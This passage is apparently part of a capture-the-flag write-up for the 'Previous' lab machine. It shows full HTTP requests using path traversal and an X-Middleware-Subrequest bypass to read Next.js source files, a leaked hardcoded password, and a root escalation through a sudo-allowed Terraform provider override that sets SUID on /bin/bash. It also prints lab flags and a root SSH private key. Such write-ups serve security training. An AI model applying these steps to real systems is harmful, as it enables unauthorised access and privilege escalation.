Content-Type: application/zip
Content-Length: 6009
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/server.js
ETag: "48xgv9zfn0go1"

const path = require('path')

const dir = path.join(__dirname)

process.env.NODE_ENV = 'production'
process.chdir(__dirname)

const currentPort = parseInt(process.env.PORT, 10) || 3000
const hostname = process.env.HOSTNAME || '0.0.0.0'

let keepAliveTimeout = parseInt(process.env.KEEP_ALIVE_TIMEOUT, 10)
const nextConfig = {"env":{},"eslint":{"ignoreDuringBuilds":false},"typescript":{"ignoreBuildErrors":false,"tsconfigPath":"tsconfig.json"},"distDir":"./.next","cleanDistDir":true,"assetPrefix":"","cacheMaxMemorySize":52428800,"configOrigin":"next.config.mjs","useFileSystemPublicRoutes":true,"generateEtags":true,"pageExtensions":["js","jsx","md","mdx","ts","tsx"],"poweredByHeader":true,"compress":true,"images":{"deviceSizes":[640,750,828,1080,1200,1920,2048,3840],"imageSizes":[16,32,48,64,96,128,256,384],"path":"/_next/image","loader":"default","loaderFile":"","domains":[],"disableStaticImages":false,"minimumCacheTTL":60,"formats":["image/webp"],"dangerouslyAllowSVG":false,"contentSecurityPolicy":"script-src 'none'; frame-src 'none'; sandbox;","contentDispositionType":"attachment","remotePatterns":[],"unoptimized":false},"devIndicators":{"position":"bottom-left"},"onDemandEntries":{"maxInactiveAge":60000,"pagesBufferLength":5},"amp":{"canonicalBase":""},"basePath":"","sassOptions":{},"trailingSlash":false,"i18n":null,"productionBrowserSourceMaps":false,"excludeDefaultMomentLocales":true,"serverRuntimeConfig":{},"publicRuntimeConfig":{},"reactProductionProfiling":false,"reactStrictMode":null,"reactMaxHeadersLength":6000,"httpAgentOptions":{"keepAlive":true},"logging":{},"expireTime":31536000,"staticPageGenerationTimeout":60,"output":"standalone","modularizeImports":{"@mui/icons-material":{"transform":"@mui/icons-material/{{member}}"},"lodash":{"transform":"lodash/{{member}}"}},"outputFileTracingRoot":"/app","experimental":{"allowedDevOrigins":[],"nodeMiddleware":false,"cacheLife":{"default":{"stale":300,"revalidate":900,"expire":4294967294},"seconds":{"stale":0,"revalidate":1,"expire":60},"minutes":{"stale":300,"revalidate":60,"expire":3600},"hours":{"stale":300,"revalidate":3600,"expire":86400},"days":{"stale":300,"revalidate":86400,"expire":604800},"weeks":{"stale":300,"revalidate":604800,"expire":2592000},"max":{"stale":300,"revalidate":2592000,"expire":4294967294}},"cacheHandlers":{},"cssChunking":true,"multiZoneDraftMode":false,"appNavFailHandling":false,"prerenderEarlyExit":true,"serverMinification":true,"serverSourceMaps":false,"linkNoTouchStart":false,"caseSensitiveRoutes":false,"clientSegmentCache":false,"preloadEntriesOnStart":true,"clientRouterFilter":true,"clientRouterFilterRedirects":false,"fetchCacheKeyPrefix":"","middlewarePrefetch":"flexible","optimisticClientCache":true,"manualClientBasePath":false,"cpus":1,"memoryBasedWorkersCount":false,"imgOptConcurrency":null,"imgOptTimeoutInSeconds":7,"imgOptMaxInputPixels":268402689,"imgOptSequentialRead":null,"isrFlushToDisk":true,"workerThreads":false,"optimizeCss":false,"nextScriptWorkers":false,"scrollRestoration":false,"externalDir":false,"disableOptimizedLoading":false,"gzipSize":true,"craCompat":false,"esmExternals":true,"fullySpecified":false,"swcTraceProfiling":false,"forceSwcTransforms":false,"largePageDataBytes":128000,"turbo":{"root":"/app"},"typedRoutes":false,"typedEnv":false,"parallelServerCompiles":false,"parallelServerBuildTraces":false,"ppr":false,"authInterrupts":false,"webpackMemoryOptimizations":false,"optimizeServerReact":true,"useEarlyImport":false,"viewTransition":false,"staleTimes":{"dynamic":0,"static":300},"serverComponentsHmrCache":true,"staticGenerationMaxConcurrency":8,"staticGenerationMinPagesPerWorker":25,"dynamicIO":false,"inlineCss":false,"useCache":false,"optimizePackageImports":["lucide-react","date-fns","lodash-es","ramda","antd","react-bootstrap","ahooks","@ant-design/icons","@headlessui/react","@headlessui-float/react","@heroicons/react/20/solid","@heroicons/react/24/solid","@heroicons/react/24/outline","@visx/visx","@tremor/react","rxjs","@mui/material","@mui/icons-material","recharts","react-use","effect","@effect/schema","@effect/platform","@effect/platform-node","@effect/platform-browser","@effect/platform-bun","@effect/sql","@effect/sql-mssql","@effect/sql-mysql2","@effect/sql-pg","@effect/sql-squlite-node","@effect/sql-squlite-bun","@effect/sql-squlite-wasm","@effect/sql-squlite-react-native","@effect/rpc","@effect/rpc-http","@effect/typeclass","@effect/experimental","@effect/opentelemetry","@material-ui/core","@material-ui/icons","@tabler/icons-react","mui-core","react-icons/ai","react-icons/bi","react-icons/bs","react-icons/cg","react-icons/ci","react-icons/di","react-icons/fa","react-icons/fa6","react-icons/fc","react-icons/fi","react-icons/gi","react-icons/go","react-icons/gr","react-icons/hi","react-icons/hi2","react-icons/im","react-icons/io","react-icons/io5","react-icons/lia","react-icons/lib","react-icons/lu","react-icons/md","react-icons/pi","react-icons/ri","react-icons/rx","react-icons/si","react-icons/sl","react-icons/tb","react-icons/tfi","react-icons/ti","react-icons/vsc","react-icons/wi"],"trustHostHeader":false,"isExperimentalCompile":false},"htmlLimitedBots":"Mediapartners-Google|Slurp|DuckDuckBot|baiduspider|yandex|sogou|bitlybot|tumblr|vkShare|quora link preview|redditbot|ia_archiver|Bingbot|BingPreview|applebot|facebookexternalhit|facebookcatalog|Twitterbot|LinkedInBot|Slackbot|Discordbot|WhatsApp|SkypeUriPreview","bundlePagesRouterDependencies":false,"configFileName":"next.config.mjs"}

process.env.__NEXT_PRIVATE_STANDALONE_CONFIG = JSON.stringify(nextConfig)

require('next')
const { startServer } = require('next/dist/server/lib/start-server')

if (
  Number.isNaN(keepAliveTimeout) ||
  !Number.isFinite(keepAliveTimeout) ||
  keepAliveTimeout < 0
) {
  keepAliveTimeout = undefined
}

startServer({
  dir,
  isDev: false,
  config: nextConfig,
  hostname,
  port: currentPort,
  allowRetry: false,
  keepAliveTimeout,
}).catch((err) => {
  console.error(err);
  process.exit(1);
});
```

Based on the output of the `server.js` we build a summary of potential directories:

1. `/app`
2. `/app/.next`
3. `/app/node_modules`
4. `/app/public`
5. `/app/pages`
6. `/app/pages/api`
7. `/app/lib` or `/app/utils`
8. `/app/prisma` (optional if using Prisma)
9. `/app/styles`
10. `/app/.env`
11. `/app/migrations` (optional if using database migrations)
12. `/app/public/_next`
13. `/app/.next/cache`
14. `/app/next.config.mjs`

With this information we looked for more default or usually available files like the `package.json`. 

**Request**

```shell
GET /api/download?example=../../../app/package.json HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzU1OTc4Mzk3LCJleHAiOjE3NTU5ODE5OTd9.clE3kgymdfxvgie2n1uSKCctcG281oHwMbQReY9Nc1I; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

The response was actually helpful even if we did not realized it right away because it showed the dependencies which like `next-auth` could have given us a hint for more potential directories to look at.

But besides that we also noticed `typescript` which is often used for the `awuthentication database` to store credentials.

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 20:33:47 GMT
Content-Type: application/zip
Content-Length: 587
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/package.json
ETag: "10ykmnkceex1j4"

{
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build"
  },
  "dependencies": {
    "@mdx-js/loader": "^3.1.0",
    "@mdx-js/react": "^3.1.0",
    "@next/mdx": "^15.3.0",
    "@tailwindcss/postcss": "^4.1.3",
    "@tailwindcss/typography": "^0.5.16",
    "@types/mdx": "^2.0.13",
    "next": "^15.2.2",
    "next-auth": "^4.24.11",
    "postcss": "^8.5.3",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "tailwindcss": "^4.1.3"
  },
  "devDependencies": {
    "@types/node": "22.14.0",
    "@types/react": "19.1.0",
    "typescript": "5.8.3"
  }
}

```

Our man `mentats` came up with another location we should check and that the actual turning point in our investigation.

The path of `/app/.next/server/pages/api/` which contained the `download.js`.

**Request**

```shell
GET /api/download?example=../../../app/.next/server/pages/api/download.js HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzU1OTc4Mzk3LCJleHAiOjE3NTU5ODE5OTd9.clE3kgymdfxvgie2n1uSKCctcG281oHwMbQReY9Nc1I; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 20:45:17 GMT
Content-Type: application/zip
Content-Length: 1513
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/.next/server/pages/api/download.js
ETag: "6ia71hjw4t45p"

"use strict";(()=>{var e={};e.id=147,e.ids=[147],e.modules={1845:(e,t,n)=>{n.r(t),n.d(t,{config:()=>f,default:()=>l,routeModule:()=>p});var r={};n.r(r),n.d(r,{default:()=>s});var i=n(3480),a=n(8667),o=n(6435);let u=require("fs");var d=n.n(u);function s(e,t){let{example:n}=e.query;if(!n||Array.isArray(n)){t.status(400).json({error:"Invalid filename"});return}let r=`${process.cwd()}/public/examples/${n}`;if(!d().existsSync(r)){t.status(404).json({error:"File not found"});return}let i=d().readFileSync(r);t.setHeader("Content-Type","application/zip"),t.setHeader("Content-Disposition",`attachment; filename=${n}`),t.setHeader("Content-Length",i.length),t.send(i)}let l=(0,o.M)(r,"default"),f=(0,o.M)(r,"config"),p=new i.PagesAPIRouteModule({definition:{kind:a.A.PAGES_API,page:"/api/download",pathname:"/api/download",bundlePath:"",filename:""},userland:r})},3480:(e,t,n)=>{e.exports=n(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,t)=>{Object.defineProperty(t,"M",{enumerable:!0,get:function(){return function e(t,n){return n in t?t[n]:"then"in t&&"function"==typeof t.then?t.then(t=>e(t,n)):"function"==typeof t&&"default"===n?t:void 0}}})},8667:(e,t)=>{Object.defineProperty(t,"A",{enumerable:!0,get:function(){return n}});var n=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})}};var t=require("../../webpack-api-runtime.js");t.C(e);var n=t(t.s=1845);module.exports=n})();
```

Knowing that this path existed allowed us to search for `auth.ts` and for the `[...nextauth].js` file. Both are commonly used to store credentials for `Next.js` applications and in this case the `[...nextauth].js` contained the `password` for `jeremy`.

**Request**

```shell
GET /api/download?example=../../../app/.next/server/pages/api/auth/[...nextauth].js HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzU1OTc4Mzk3LCJleHAiOjE3NTU5ODE5OTd9.clE3kgymdfxvgie2n1uSKCctcG281oHwMbQReY9Nc1I; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 20:39:05 GMT
Content-Type: application/zip
Content-Length: 1537
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/.next/server/pages/api/auth/[...nextauth].js
ETag: "ihx6eiwskd47b"

"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

| Username | Password                       |
| -------- | ------------------------------ |
| jeremy   | MyNameIsJeremyAndILovePancakes |

This allowed us to access to box via `SSH` and to grab the `user.txt`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh jeremy@10.129.214.193
The authenticity of host '10.129.214.193 (10.129.214.193)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:48: [hashed name]
    ~/.ssh/known_hosts:95: [hashed name]
    ~/.ssh/known_hosts:184: [hashed name]
    ~/.ssh/known_hosts:185: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.214.193' (ED25519) to the list of known hosts.
jeremy@10.129.214.193's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug 23 08:46:37 PM UTC 2025

  System load:  0.01              Processes:             215
  Usage of /:   68.5% of 8.76GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.129.214.193
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Sat Aug 23 20:46:37 2025 from 10.10.16.36
jeremy@previous:~$
```

## user.txt

```shell
jeremy@previous:~$ cat user.txt 
588615a770d3086d1e35885f70d5c3c2
```

## Enumeration

Our first step was to rule out the obvious checks like `group memberships`, `sudo capabilities` and content of the `home directory` of our current user.

The user `jeremy` had no special or useful `group memberships`.

```shell
jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
```

However, he was allowed to execute `/usr/bin/terraform` with the option of `-chdir\=/opt/examples apply` using `sudo`.

```shell
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

According to this we checked `/opt` and found the `Terraform` related structure and files.

```shell
jeremy@previous:/opt$ ls -la
total 20
drwxr-xr-x  5 root root 4096 Aug 21 20:09 .
drwxr-xr-x 18 root root 4096 Aug 21 20:23 ..
drwx--x--x  4 root root 4096 Aug 21 20:09 containerd
drwxr-xr-x  3 root root 4096 Aug 23 20:49 examples
drwxr-xr-x  3 root root 4096 Aug 21 20:09 terraform-provider-examples
```

His `home directory` conveniently contained a `.terraformrc` which described the location of the `example files` for `Terraform`.

```shell
jeremy@previous:~$ ls -la
total 40
drwxr-x--- 5 jeremy jeremy 4096 Aug 23 20:35 .
drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
drwxr-xr-x 2 root   root   4096 Aug 23 20:35 .terraform.d
-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
-rw-r----- 1 root   jeremy   33 Aug 23 19:01 user.txt
```

```shell
jeremy@previous:~$ cat .terraformrc 
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

## Privilege Escalation to root

### Terraform Misconfiguration

Now the plan to abuse this `misconfiguration` was quite simple and straight forward. We wanted to create our own `examples files` containing our `payload` to get executed in the context of `root` through `sudo`.

Because the directory within `/opt` was not writeable to us, we moved to `/tmp` and created a `terraform-provider-example` file. This also hinted us that we probably need to override the `environment variables` to set a different location for our malicious `terraform.rc` file by using `exports`.

```shell
jeremy@previous:/tmp$ cat terraform-provider-examples 
#!/bin/bash
chmod u+s /bin/bash
```

```shell
jeremy@previous:/tmp$ chmod +x terraform-provider-examples
```

To achieve that we first took the content of the `.terraformrc` file inside the `home directory` of `jeremy` and pointed it to `/tmp`.

```shell
jeremy@previous:/tmp$ cat terraform.rc 
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
```

Then we made use of the `environment variable` of `Terraform` called `TF_CLI_CONFIG_FILE`  to export `/tmp/terraform.rc`.

```shell
jeremy@previous:/tmp$ export TF_CLI_CONFIG_FILE=/tmp/terraform.rc
```

As the last step, all we had to do was execute the command using `sudo`, and we set the `SUID bit` on `/bin/bash`. This allowed us to invoke `/bin/bash -p` as the user `jeremy`, which `preserved` the `privileges` during execution and granted us a `shell` as `root`.

```shell
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
[sudo] password for jeremy: 
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to instantiate provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /tmp/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
```

```shell
jeremy@previous:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```shell
jeremy@previous:~$ /bin/bash -p
bash-5.1#
```

```shell
bash-5.1# cat root.txt
e2a6dcc5ea7853b9b40ee375dffb5066
```

## Post Exploitation

```shell
root@previous:~/.ssh# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Previous/files]
└─$ cat root_id_rsa  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmxhpS4UBVdbNosrMXPuKzRSbCOTgUH0/Tp/Yb32hyiMyMT68JuwK
bX8jLmjb//cojY1uIkYnO/pkCZIP7PZ3goq5SW7vV1meweQ8pYG1rMKbB8XXVGjMg9smuR
R5rXbvlfVylGTIix1CDjxNqtzo03nW95Cj4WgEh8xDSryQq+tg2koz33swCppjWCGKkmdD
pG/zG6u+lvEVE8Rlzrsk5y01Lsal0SRbaeRsYwXmtSCkThU9ktaJOVQvXfTzZqyg9aK/1f
Wj0a+cSYz01yzW+OaDIo0/sVgGdW0qw3khl9VHqpnse4SIbGld4Hagxq+Y7f5Is+WESNnD
YdUvwPo5aSUxQJZTZ4l5zSDey/K5GPQnF2NPn6/vxJ7i0xLLGGUczb77CtCt/zV0K8T+6m
cx8WzTJm8DxFEMt9e6Z5bF5j/ioQx55PTrxR1DEy4KNphNPCuHGmSfxRxWb1hZ/IRObN4V
A7FGgWy0RUYkQLed0t5OZf3C/ShvJWHFesQscO7pAAAFiIyQVqmMkFapAAAAB3NzaC1yc2
EAAAGBAJsYaUuFAVXWzaLKzFz7is0Umwjk4FB9P06f2G99ocojMjE+vCbsCm1/Iy5o2//3
KI2NbiJGJzv6ZAmSD+z2d4KKuUlu71dZnsHkPKWBtazCmwfF11RozIPbJrkUea1275X1cp
RkyIsdQg48Tarc6NN51veQo+FoBIfMQ0q8kKvrYNpKM997MAqaY1ghipJnQ6Rv8xurvpbx
FRPEZc67JOctNS7GpdEkW2nkbGMF5rUgpE4VPZLWiTlUL13082asoPWiv9X1o9GvnEmM9N
cs1vjmgyKNP7FYBnVtKsN5IZfVR6qZ7HuEiGxpXeB2oMavmO3+SLPlhEjZw2HVL8D6OWkl
MUCWU2eJec0g3svyuRj0JxdjT5+v78Se4tMSyxhlHM2++wrQrf81dCvE/upnMfFs0yZvA8
RRDLfXumeWxeY/4qEMeeT068UdQxMuCjaYTTwrhxpkn8UcVm9YWfyETmzeFQOxRoFstEVG
JEC3ndLeTmX9wv0obyVhxXrELHDu6QAAAAMBAAEAAAGASkQ4N3drGkWPloJxtZyl7GoPiw
S9/QzcgbO9GjYYgQi1gis+QY0JuUEGAbUok7swagftUvAw3WGbAZI1mgyzUYlIDEfYyAUc
JlA6Ui54Zk+RmPk9kSfVttX8BugtE8k+FJrB0RkphqPt+48YydaajplrPITAVLFQag5/so
v04r4FVMHvcPY2HP2s0IjPKCfWlikdSoTE8NZkd2C2N3YZx7E4JDvvLuSv+VbuJ8StotIM
m29EWsnsT81mGSGwY9wJQA2o4dPFiY2NIJN291z+8yUjOqEAtUpdzzz+rC6rw0LLGZmMRD
JGHPZqKm5npOjRrik3l4B2WLAj65x2tNOXbyrOn3mJXuFJeZWuOUZc/aneX8Psw8SiwCN2
0AvDwWxJ/LUV/WUEBsS5blHzwAnaN14Wn7Pvb7qDjMe6RLLnoi6uplQFa3Dd6YOvRqbRhD
p6xqb8JuyfiZPsDW3tUfeJtIpJG/xTAG+A2b28HO46DlVc/cpWjr8jWB5sLllpx9PZAAAA
wDd+4xHpgC/vYgBokVVXzOwOJg3HpKiEY0SI62zXV3M83aJNvwCrLe6AAEa7j+PoOvqsex
